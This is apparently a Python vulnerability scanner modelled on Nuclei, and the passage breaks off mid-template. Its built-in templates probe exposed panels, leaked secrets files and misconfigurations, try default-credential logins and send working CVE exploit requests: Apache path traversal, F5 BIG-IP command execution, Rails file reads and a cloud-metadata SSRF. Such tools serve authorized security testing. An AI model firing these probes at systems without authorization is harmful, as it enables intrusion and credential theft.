#!/usr/bin/env python3
"""
ZYLON FUSION v5.0 NUCLEAR - Nuclei-Style Template Engine
========================================================
Fused from: projectdiscovery/nuclei (Pure Python - No Go binary)
Purpose: YAML-based template vulnerability scanning
Features:
  - YAML-based template parsing for vulnerability scanning
  - Template categories: CVE, exposed panels, misconfigurations,
    default credentials, info disclosure
  - Built-in template library (50+ templates)
  - HTTP request templating with matchers
  - Multi-matcher support (status, word, regex, binary, dsl)
  - Template execution engine with concurrency
  - Workflow templates (chained templates)
  - Severity classification (critical, high, medium, low, info)
  - Template authoring support
Python 3.13 Compatible | Termux Non-Root | No telnetlib
"""

import os
import re
import sys
import time
import yaml
import json
import random
import threading
import requests
import urllib3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# ANSI COLOR CODES
# ============================================================================

R = '\033[91m'    # Red
G = '\033[92m'    # Green
Y = '\033[93m'    # Yellow
C = '\033[96m'    # Cyan
W = '\033[97m'    # White
B = '\033[94m'    # Blue
M = '\033[95m'    # Magenta
BD = '\033[1m'    # Bold
RS = '\033[0m'    # Reset
DIM = '\033[2m'   # Dim

# ============================================================================
# SEVERITY LEVELS
# ============================================================================

SEVERITY_LEVELS = {
    'critical': 5,
    'high': 4,
    'medium': 3,
    'low': 2,
    'info': 1,
}

SEVERITY_COLORS = {
    'critical': R,
    'high': '\033[91m',
    'medium': Y,
    'low': C,
    'info': DIM,
}

# ============================================================================
# BUILT-IN TEMPLATES (50+)
# ============================================================================

BUILTIN_TEMPLATES = [
    # ========================================================================
    # EXPOSED ADMIN PANELS (12 templates)
    # ========================================================================
    {
        'id': 'exposed-admin-panel',
        'info': {
            'name': 'Exposed Admin Panel',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Detects exposed admin login panels',
            'category': 'exposed_panel',
            'tags': ['admin', 'panel', 'exposed'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/admin', '/admin/', '/administrator', '/admin/login', '/admin/dashboard'],
            'matchers': {
                'status': [200],
                'word': ['admin', 'login', 'password', 'dashboard'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'exposed-phpmyadmin',
        'info': {
            'name': 'Exposed phpMyAdmin',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Detects exposed phpMyAdmin interface',
            'category': 'exposed_panel',
            'tags': ['phpmyadmin', 'database', 'admin'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/phpmyadmin', '/phpmyadmin/', '/pma', '/pma/', '/phpmyadmin/index.php', '/dbadmin'],
            'matchers': {
                'status': [200],
                'word': ['phpMyAdmin', 'phpmyadmin', 'Server version', 'Language'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'exposed-wordpress-admin',
        'info': {
            'name': 'Exposed WordPress Admin',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Detects exposed WordPress admin panel',
            'category': 'exposed_panel',
            'tags': ['wordpress', 'wp-admin', 'cms'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/wp-admin/', '/wp-login.php', '/wp-admin/index.php'],
            'matchers': {
                'status': [200],
                'word': ['WordPress', 'wp-login', 'log-in', 'wp-admin'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'exposed-jenkins',
        'info': {
            'name': 'Exposed Jenkins',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Detects exposed Jenkins CI/CD panel',
            'category': 'exposed_panel',
            'tags': ['jenkins', 'ci', 'devops'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/jenkins', '/jenkins/', '/ci', '/ci/'],
            'matchers': {
                'status': [200],
                'word': ['Jenkins', 'Dashboard', 'Build Queue'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'exposed-grafana',
        'info': {
            'name': 'Exposed Grafana',
            'author': 'zylon',
            'severity': 'medium',
            'description': 'Detects exposed Grafana dashboard',
            'category': 'exposed_panel',
            'tags': ['grafana', 'dashboard', 'monitoring'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/grafana', '/grafana/', '/dashboard', '/d/'],
            'matchers': {
                'status': [200],
                'word': ['Grafana', 'grafana-app', 'window.grafanaBootData'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'exposed-kibana',
        'info': {
            'name': 'Exposed Kibana',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Detects exposed Kibana dashboard',
            'category': 'exposed_panel',
            'tags': ['kibana', 'elasticsearch', 'dashboard'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/kibana', '/kibana/', '/app/kibana', '/app/kibana/'],
            'matchers': {
                'status': [200],
                'word': ['Kibana', 'kibana', 'elastic', 'eui'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'exposed-solr',
        'info': {
            'name': 'Exposed Apache Solr',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Detects exposed Apache Solr admin',
            'category': 'exposed_panel',
            'tags': ['solr', 'search', 'apache'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/solr', '/solr/', '/solr/admin'],
            'matchers': {
                'status': [200],
                'word': ['Solr Admin', 'solr-admin', 'Dashboard', 'solr'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'exposed-tomcat-manager',
        'info': {
            'name': 'Exposed Tomcat Manager',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Detects exposed Apache Tomcat Manager',
            'category': 'exposed_panel',
            'tags': ['tomcat', 'manager', 'apache'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/manager/html', '/manager/status', '/host-manager/html'],
            'matchers': {
                'status': [200, 401],
                'word': ['Tomcat', 'manager', 'Apache Tomcat'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'exposed-gitlab',
        'info': {
            'name': 'Exposed GitLab',
            'author': 'zylon',
            'severity': 'medium',
            'description': 'Detects exposed GitLab instance',
            'category': 'exposed_panel',
            'tags': ['gitlab', 'git', 'devops'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/users/sign_in', '/explore', '/-/graphql-explorer'],
            'matchers': {
                'status': [200],
                'word': ['GitLab', 'gitlab', 'sign_in', 'GitLab Community Edition'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'exposed-sonarqube',
        'info': {
            'name': 'Exposed SonarQube',
            'author': 'zylon',
            'severity': 'medium',
            'description': 'Detects exposed SonarQube instance',
            'category': 'exposed_panel',
            'tags': ['sonarqube', 'code-quality'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/sonarqube', '/sonarqube/', '/api/server/version'],
            'matchers': {
                'status': [200],
                'word': ['SonarQube', 'sonarqube', 'sonar'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'exposed-rabbitmq',
        'info': {
            'name': 'Exposed RabbitMQ Management',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Detects exposed RabbitMQ management plugin',
            'category': 'exposed_panel',
            'tags': ['rabbitmq', 'mq', 'messaging'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/api/overview', '/#//', '/'],
            'matchers': {
                'status': [200],
                'word': ['RabbitMQ', 'rabbitmq', 'management'],
                'word_condition': 'or',
            },
            'headers': {'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q='},  # guest:guest
        }],
    },
    {
        'id': 'exposed-jupyter',
        'info': {
            'name': 'Exposed Jupyter Notebook',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Detects exposed Jupyter Notebook',
            'category': 'exposed_panel',
            'tags': ['jupyter', 'notebook', 'python'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/tree', '/notebooks', '/lab', '/api/kernels'],
            'matchers': {
                'status': [200],
                'word': ['Jupyter', 'notebook', 'jupyter'],
                'word_condition': 'or',
            },
        }],
    },

    # ========================================================================
    # DEFAULT CREDENTIALS (11 templates)
    # ========================================================================
    {
        'id': 'default-creds-tomcat',
        'info': {
            'name': 'Tomcat Default Credentials',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Tests for Apache Tomcat default credentials',
            'category': 'default_creds',
            'tags': ['tomcat', 'default', 'credentials'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/manager/html'],
            'headers': {'Authorization': 'Basic dG9tY2F0OnRvbWNhdA=='},  # tomcat:tomcat
            'matchers': {
                'status': [200],
                'word': ['Tomcat Web Application Manager', 'Server Info'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'default-creds-admin-admin',
        'info': {
            'name': 'Admin/Admin Default Credentials',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Tests for admin:admin default credentials',
            'category': 'default_creds',
            'tags': ['default', 'credentials', 'admin'],
        },
        'requests': [{
            'method': 'POST',
            'path': ['/login', '/api/login', '/auth/login'],
            'data': {'username': 'admin', 'password': 'admin'},
            'matchers': {
                'status': [200, 302],
                'word': ['welcome', 'dashboard', 'token', 'session', 'success'],
                'word_condition': 'or',
                'negative_words': ['invalid', 'incorrect', 'failed', 'unauthorized', 'wrong'],
            },
        }],
    },
    {
        'id': 'default-creds-root-root',
        'info': {
            'name': 'Root/Root Default Credentials',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Tests for root:root default credentials',
            'category': 'default_creds',
            'tags': ['default', 'credentials', 'root'],
        },
        'requests': [{
            'method': 'POST',
            'path': ['/login', '/api/login', '/auth/login'],
            'data': {'username': 'root', 'password': 'root'},
            'matchers': {
                'status': [200, 302],
                'word': ['welcome', 'dashboard', 'token', 'session', 'success'],
                'word_condition': 'or',
                'negative_words': ['invalid', 'incorrect', 'failed', 'unauthorized'],
            },
        }],
    },
    {
        'id': 'default-creds-rabbitmq',
        'info': {
            'name': 'RabbitMQ Default Credentials',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Tests for RabbitMQ guest:guest default credentials',
            'category': 'default_creds',
            'tags': ['rabbitmq', 'default', 'credentials'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/api/overview'],
            'headers': {'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q='},  # guest:guest
            'matchers': {
                'status': [200],
                'word': ['rabbitmq_version', 'RabbitMQ', 'cluster_name'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'default-creds-jenkins',
        'info': {
            'name': 'Jenkins Default Credentials',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Tests for Jenkins default credentials',
            'category': 'default_creds',
            'tags': ['jenkins', 'default', 'credentials'],
        },
        'requests': [{
            'method': 'POST',
            'path': ['/j_acegi_security_check', '/jenkins/j_acegi_security_check'],
            'data': {'j_username': 'admin', 'j_password': 'admin'},
            'matchers': {
                'status': [302, 200],
                'regex': ['Location:.*/dashboard', 'Location:.*/view/'],
            },
        }],
    },
    {
        'id': 'default-creds-mysql',
        'info': {
            'name': 'MySQL Default Credentials Check',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Checks for MySQL admin panel with default creds',
            'category': 'default_creds',
            'tags': ['mysql', 'adminer', 'database'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/adminer.php', '/mysql-admin/', '/phpmyadmin/'],
            'matchers': {
                'status': [200],
                'word': ['Login', 'MySQL', 'Server', 'Username', 'Password'],
                'word_condition': 'and',
            },
        }],
    },
    {
        'id': 'default-creds-postgres',
        'info': {
            'name': 'Postgres Default Credentials Check',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Checks for PostgreSQL admin panel with default creds',
            'category': 'default_creds',
            'tags': ['postgres', 'pgadmin', 'database'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/pgadmin', '/pgadmin/', '/pgadmin4/'],
            'matchers': {
                'status': [200],
                'word': ['pgAdmin', 'PostgreSQL', 'Login'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'default-creds-mongo-express',
        'info': {
            'name': 'Mongo Express Default Credentials',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Tests for mongo-express default credentials',
            'category': 'default_creds',
            'tags': ['mongodb', 'mongo-express', 'database'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/mongo-express/', '/mongo/', '/admin/'],
            'matchers': {
                'status': [200],
                'word': ['mongo-express', 'MongoDB', 'Express', 'Database'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'default-creds-ftp-web',
        'info': {
            'name': 'FTP Web Admin Default Creds',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Checks for FTP web admin panel',
            'category': 'default_creds',
            'tags': ['ftp', 'admin', 'default'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/ftp/', '/ftpadmin/', '/filemanager/'],
            'matchers': {
                'status': [200],
                'word': ['FTP', 'File Manager', 'Upload', 'Directory'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'default-creds-drupal',
        'info': {
            'name': 'Drupal Default Admin',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Checks for Drupal admin login with default creds',
            'category': 'default_creds',
            'tags': ['drupal', 'cms', 'default'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/user/login', '/admin/', '/user/1'],
            'matchers': {
                'status': [200],
                'word': ['Drupal', 'Enter your username', 'Log in'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'default-creds-keycloak',
        'info': {
            'name': 'Keycloak Default Admin',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Tests for Keycloak default admin credentials',
            'category': 'default_creds',
            'tags': ['keycloak', 'sso', 'default'],
        },
        'requests': [{
            'method': 'POST',
            'path': ['/auth/admin/master/console/', '/admin/master/console/'],
            'data': {'username': 'admin', 'password': 'admin'},
            'matchers': {
                'status': [200, 302],
                'word': ['realm', 'Keycloak', 'admin-console'],
                'word_condition': 'or',
            },
        }],
    },

    # ========================================================================
    # INFO DISCLOSURE (11 templates)
    # ========================================================================
    {
        'id': 'info-disclosure-git',
        'info': {
            'name': 'Git Repository Exposure',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Detects exposed .git directory',
            'category': 'info_disclosure',
            'tags': ['git', 'exposure', 'source-code'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/.git/HEAD', '/.git/config', '/.git/refs/heads/master'],
            'matchers': {
                'status': [200],
                'word': ['ref:', '[core]', '[remote "origin"]'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'info-disclosure-env',
        'info': {
            'name': '.env File Exposure',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Detects exposed .env configuration file',
            'category': 'info_disclosure',
            'tags': ['env', 'config', 'secrets'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/.env', '/.env.local', '/.env.production', '/.env.backup'],
            'matchers': {
                'status': [200],
                'word': ['DB_', 'APP_KEY', 'SECRET', 'PASSWORD', 'API_KEY', 'DATABASE_URL'],
                'word_condition': 'or',
                'negative_words': ['<html', '<!DOCTYPE', '<?xml'],
            },
        }],
    },
    {
        'id': 'info-disclosure-phpinfo',
        'info': {
            'name': 'PHP Info Page Exposure',
            'author': 'zylon',
            'severity': 'medium',
            'description': 'Detects exposed phpinfo page',
            'category': 'info_disclosure',
            'tags': ['phpinfo', 'php', 'server-info'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/phpinfo.php', '/info.php', '/test.php', '/pi.php'],
            'matchers': {
                'status': [200],
                'word': ['PHP Version', 'phpinfo()', 'Configuration File'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'info-disclosure-server-status',
        'info': {
            'name': 'Apache Server Status',
            'author': 'zylon',
            'severity': 'medium',
            'description': 'Detects exposed Apache server-status page',
            'category': 'info_disclosure',
            'tags': ['apache', 'server-status', 'info'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/server-status', '/server-status/', '/server-info'],
            'matchers': {
                'status': [200],
                'word': ['Server Status', 'Apache Server', 'Current Time', 'Server Version'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'info-disclosure-actuator',
        'info': {
            'name': 'Spring Boot Actuator Exposure',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Detects exposed Spring Boot Actuator endpoints',
            'category': 'info_disclosure',
            'tags': ['spring', 'actuator', 'java', 'boot'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/actuator', '/actuator/env', '/actuator/health', '/actuator/configprops', '/actuator/mappings'],
            'matchers': {
                'status': [200],
                'word': ['{"_links"', '"self"', '"health"', '"env"', 'actuator'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'info-disclosure-swagger',
        'info': {
            'name': 'Swagger/OpenAPI Exposure',
            'author': 'zylon',
            'severity': 'medium',
            'description': 'Detects exposed Swagger/OpenAPI documentation',
            'category': 'info_disclosure',
            'tags': ['swagger', 'openapi', 'api-docs'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/swagger-ui/', '/api-docs', '/swagger.json', '/openapi.json', '/v2/api-docs', '/v3/api-docs'],
            'matchers': {
                'status': [200],
                'word': ['swagger', 'openapi', 'api-docs', '"paths"', '"info"'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'info-disclosure-docker',
        'info': {
            'name': 'Docker Configuration Exposure',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Detects exposed Docker configuration files',
            'category': 'info_disclosure',
            'tags': ['docker', 'container', 'config'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/.dockerenv', '/Dockerfile', '/docker-compose.yml', '/docker-compose.yaml'],
            'matchers': {
                'status': [200],
                'word': ['FROM ', 'version:', 'services:', 'image:'],
                'word_condition': 'or',
                'negative_words': ['<html', '<!DOCTYPE'],
            },
        }],
    },
    {
        'id': 'info-disclosure-aws-credentials',
        'info': {
            'name': 'AWS Credentials Exposure',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Detects exposed AWS credentials file',
            'category': 'info_disclosure',
            'tags': ['aws', 'credentials', 'cloud'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/.aws/credentials', '/aws-credentials', '/.aws/config'],
            'matchers': {
                'status': [200],
                'word': ['aws_access_key_id', 'aws_secret_access_key', 'AKIA'],
                'word_condition': 'or',
                'negative_words': ['<html', '<!DOCTYPE'],
            },
        }],
    },
    {
        'id': 'info-disclosure-robots',
        'info': {
            'name': 'Robots.txt Sensitive Paths',
            'author': 'zylon',
            'severity': 'info',
            'description': 'Analyzes robots.txt for sensitive paths',
            'category': 'info_disclosure',
            'tags': ['robots', 'paths', 'discovery'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/robots.txt'],
            'matchers': {
                'status': [200],
                'word': ['Disallow', 'Allow', 'Sitemap'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'info-disclosure-sitemap',
        'info': {
            'name': 'Sitemap.xml Information Disclosure',
            'author': 'zylon',
            'severity': 'info',
            'description': 'Analyzes sitemap.xml for hidden paths',
            'category': 'info_disclosure',
            'tags': ['sitemap', 'paths', 'discovery'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/sitemap.xml'],
            'matchers': {
                'status': [200],
                'word': ['<urlset', '<url>', '<loc>'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'info-disclosure-stack-trace',
        'info': {
            'name': 'Stack Trace Exposure',
            'author': 'zylon',
            'severity': 'medium',
            'description': 'Detects stack traces in error pages',
            'category': 'info_disclosure',
            'tags': ['stack-trace', 'error', 'debug'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/nonexistent_page_zylon_test', '/debug', '/error', '/trace'],
            'matchers': {
                'status': [500, 404],
                'regex': [r'(Traceback|Exception|at\s+\w+\.\w+\(.*\.java:\d+\)|Stack Trace|Error Report)'],
            },
        }],
    },

    # ========================================================================
    # MISCONFIGURATIONS (11 templates)
    # ========================================================================
    {
        'id': 'misconfig-cors-wildcard',
        'info': {
            'name': 'CORS Wildcard Misconfiguration',
            'author': 'zylon',
            'severity': 'medium',
            'description': 'Detects CORS allowing all origins',
            'category': 'misconfiguration',
            'tags': ['cors', 'misconfig', 'header'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/'],
            'headers': {'Origin': 'https://evil.com'},
            'matchers': {
                'status': [200],
                'regex': [r'Access-Control-Allow-Origin:\s*\*|Access-Control-Allow-Origin:\s*https://evil\.com'],
            },
        }],
    },
    {
        'id': 'misconfig-clickjacking',
        'info': {
            'name': 'Clickjacking (Missing X-Frame-Options)',
            'author': 'zylon',
            'severity': 'medium',
            'description': 'Detects missing X-Frame-Options header',
            'category': 'misconfiguration',
            'tags': ['clickjacking', 'header', 'frame'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/'],
            'matchers': {
                'status': [200],
                'dsl': ['!response_headers.get("X-Frame-Options") and !response_headers.get("Content-Security-Policy")'],
            },
        }],
    },
    {
        'id': 'misconfig-hsts-missing',
        'info': {
            'name': 'Missing HSTS Header',
            'author': 'zylon',
            'severity': 'low',
            'description': 'Detects missing Strict-Transport-Security header',
            'category': 'misconfiguration',
            'tags': ['hsts', 'header', 'ssl'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/'],
            'matchers': {
                'status': [200],
                'dsl': ['!response_headers.get("Strict-Transport-Security")'],
            },
        }],
    },
    {
        'id': 'misconfig-options-enabled',
        'info': {
            'name': 'HTTP OPTIONS Method Enabled',
            'author': 'zylon',
            'severity': 'low',
            'description': 'Detects if HTTP OPTIONS method is enabled',
            'category': 'misconfiguration',
            'tags': ['options', 'method', 'verb'],
        },
        'requests': [{
            'method': 'OPTIONS',
            'path': ['/'],
            'matchers': {
                'status': [200, 204],
                'word': ['Allow', 'OPTIONS', 'GET', 'POST'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'misconfig-put-delete-enabled',
        'info': {
            'name': 'HTTP PUT/DELETE Methods Enabled',
            'author': 'zylon',
            'severity': 'medium',
            'description': 'Detects if HTTP PUT or DELETE methods are enabled',
            'category': 'misconfiguration',
            'tags': ['put', 'delete', 'method', 'verb'],
        },
        'requests': [{
            'method': 'PUT',
            'path': ['/zylon_test_file.txt'],
            'data': 'zylon_test_content',
            'matchers': {
                'status': [200, 201, 204],
            },
        }],
    },
    {
        'id': 'misconfig-directory-listing',
        'info': {
            'name': 'Directory Listing Enabled',
            'author': 'zylon',
            'severity': 'medium',
            'description': 'Detects enabled directory listing',
            'category': 'misconfiguration',
            'tags': ['directory', 'listing', 'index'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/uploads/', '/images/', '/files/', '/static/', '/assets/'],
            'matchers': {
                'status': [200],
                'word': ['Index of', 'Directory listing', 'Parent Directory', '<title>Index'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'misconfig-x-powered-by',
        'info': {
            'name': 'X-Powered-By Header Leak',
            'author': 'zylon',
            'severity': 'info',
            'description': 'Detects X-Powered-By header revealing technology',
            'category': 'misconfiguration',
            'tags': ['header', 'fingerprint', 'tech'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/'],
            'matchers': {
                'status': [200],
                'regex': [r'X-Powered-By:\s*.+'],
            },
        }],
    },
    {
        'id': 'misconfig-server-header',
        'info': {
            'name': 'Server Header Information Leak',
            'author': 'zylon',
            'severity': 'info',
            'description': 'Detects Server header revealing technology details',
            'category': 'misconfiguration',
            'tags': ['header', 'fingerprint', 'server'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/'],
            'matchers': {
                'status': [200],
                'regex': [r'Server:\s*(Apache|nginx|IIS|Tomcat|Express|PHP|Jetty).+'],
            },
        }],
    },
    {
        'id': 'misconfig-cache-control',
        'info': {
            'name': 'Missing Cache-Control Header',
            'author': 'zylon',
            'severity': 'low',
            'description': 'Detects missing Cache-Control header on sensitive pages',
            'category': 'misconfiguration',
            'tags': ['cache', 'header', 'session'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/login', '/account', '/profile', '/admin'],
            'matchers': {
                'status': [200],
                'dsl': ['!response_headers.get("Cache-Control")'],
            },
        }],
    },
    {
        'id': 'misconfig-cookie-httponly',
        'info': {
            'name': 'Cookie Missing HttpOnly Flag',
            'author': 'zylon',
            'severity': 'low',
            'description': 'Detects session cookies without HttpOnly flag',
            'category': 'misconfiguration',
            'tags': ['cookie', 'httponly', 'session'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/login'],
            'matchers': {
                'status': [200, 302],
                'regex': [r'Set-Cookie:.*(?:session|sid|auth|token).*=(?![^;]*HttpOnly)'],
            },
        }],
    },
    {
        'id': 'misconfig-debug-mode',
        'info': {
            'name': 'Application Debug Mode Enabled',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Detects if application debug mode is enabled',
            'category': 'misconfiguration',
            'tags': ['debug', 'mode', 'development'],
        },
        'requests': [{
            'method': 'GET',
            'path': ['/_debug', '/debug', '/flask-debug', '/django-debug', '/var/log/'],
            'matchers': {
                'status': [200],
                'word': ['DEBUG', 'debug', 'traceback', 'Stack trace', 'Flask-Debug'],
                'word_condition': 'or',
            },
        }],
    },

    # ========================================================================
    # KNOWN CVEs (11 templates)
    # ========================================================================
    {
        'id': 'cve-2021-41773',
        'info': {
            'name': 'Apache Path Traversal (CVE-2021-41773)',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Apache HTTP Server 2.4.49 Path Traversal',
            'category': 'cve',
            'tags': ['apache', 'path-traversal', 'cve-2021', 'rce'],
            'cve': 'CVE-2021-41773',
        },
        'requests': [{
            'method': 'GET',
            'path': ['/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd', '/icons/.%2e/%2e%2e/%2e%2e/etc/passwd'],
            'matchers': {
                'status': [200],
                'word': ['root:x:0:0', '/bin/bash', '/bin/sh'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'cve-2021-42013',
        'info': {
            'name': 'Apache Path Traversal (CVE-2021-42013)',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Apache HTTP Server 2.4.50 Path Traversal bypass',
            'category': 'cve',
            'tags': ['apache', 'path-traversal', 'cve-2021', 'rce'],
            'cve': 'CVE-2021-42013',
        },
        'requests': [{
            'method': 'GET',
            'path': ['/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'],
            'matchers': {
                'status': [200],
                'word': ['root:x:0:0', '/bin/bash'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'cve-2017-9791',
        'info': {
            'name': 'Apache Struts2 REST Plugin RCE (CVE-2017-9791)',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Apache Struts2 REST plugin XStream RCE',
            'category': 'cve',
            'tags': ['struts', 'rce', 'xstream', 'cve-2017'],
            'cve': 'CVE-2017-9791',
        },
        'requests': [{
            'method': 'POST',
            'path': ['/struts2-rest-showcase/orders.xhtml', '/rest/orders.xhtml'],
            'headers': {'Content-Type': 'application/xml'},
            'data': '<map><entry><string>test</string><string>zylon_cve_test</string></entry></map>',
            'matchers': {
                'status': [200, 500],
                'word': ['zylon_cve_test', 'xstream', 'struts'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'cve-2019-5418',
        'info': {
            'name': 'Rails File Content Disclosure (CVE-2019-5418)',
            'author': 'zylon',
            'severity': 'high',
            'description': 'Ruby on Rails Accept header file content disclosure',
            'category': 'cve',
            'tags': ['rails', 'ruby', 'file-read', 'cve-2019'],
            'cve': 'CVE-2019-5418',
        },
        'requests': [{
            'method': 'GET',
            'path': ['/'],
            'headers': {'Accept': '../../../../../../../../etc/passwd{{'},
            'matchers': {
                'status': [200],
                'word': ['root:x:0:0'],
            },
        }],
    },
    {
        'id': 'cve-2020-5902',
        'info': {
            'name': 'F5 BIG-IP RCE (CVE-2020-5902)',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'F5 BIG-IP TMUI Directory Traversal RCE',
            'category': 'cve',
            'tags': ['f5', 'big-ip', 'rce', 'cve-2020'],
            'cve': 'CVE-2020-5902',
        },
        'requests': [{
            'method': 'GET',
            'path': ['/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd', '/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'],
            'matchers': {
                'status': [200],
                'word': ['root:x:0:0', 'admin', 'output'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'cve-2021-21975',
        'info': {
            'name': 'VMware vRealize SSRF (CVE-2021-21975)',
            'author': 'zylon',
            'severity': 'high',
            'description': 'VMware vRealize Operations Manager SSRF',
            'category': 'cve',
            'tags': ['vmware', 'ssrf', 'cve-2021'],
            'cve': 'CVE-2021-21975',
        },
        'requests': [{
            'method': 'POST',
            'path': ['/casa/nodes/thumbprints'],
            'data': '{"hostnames": ["http://169.254.169.254/latest/meta-data/"]}',
            'headers': {'Content-Type': 'application/json'},
            'matchers': {
                'status': [200],
                'word': ['ami-id', 'instance-id', 'thumbprint'],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'cve-2022-1388',
        'info': {
            'name': 'F5 BIG-IP iControl RCE (CVE-2022-1388)',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'F5 BIG-IP iControl REST Auth Bypass RCE',
            'category': 'cve',
            'tags': ['f5', 'big-ip', 'rce', 'cve-2022', 'auth-bypass'],
            'cve': 'CVE-2022-1388',
        },
        'requests': [{
            'method': 'POST',
            'path': ['/mgmt/tm/util/bash'],
            'headers': {
                'Authorization': 'Basic YWRtaW46YWRtaW4=',
                'X-F5-Auth-Token': '',
                'Connection': 'X-F5-Auth-Token',
            },
            'data': '{"command":"run","utilCmdArgs":"-c id"}',
            'matchers': {
                'status': [200],
                'word': ['uid=', 'commandResult', 'gid='],
                'word_condition': 'or',
            },
        }],
    },
    {
        'id': 'cve-2021-44228',
        'info': {
            'name': 'Log4Shell (CVE-2021-44228)',
            'author': 'zylon',
            'severity': 'critical',
            'description': 'Apache Log4j Remote Code Execution',
            'category': 'cve',
